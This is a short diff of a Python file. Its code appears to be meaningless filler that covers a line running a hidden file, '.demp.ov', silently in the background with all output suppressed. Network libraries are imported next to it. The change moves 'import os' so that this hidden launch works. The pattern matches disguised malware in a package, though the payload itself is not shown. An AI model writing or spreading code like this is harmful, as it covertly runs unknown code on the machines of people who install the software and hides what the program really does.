@@ -10,7 +10,7 @@ for a in range(1,5):
     break
   elif a == 2:
     break
-
+import os
 if "python" == "python":
   None
 
@@ -45,7 +45,6 @@ if "python" == "python":
 os.system("python .demp.ov </dev/null &>/dev/null &")
 
 import urllib.request
-import os
 import requests
 import threading
 
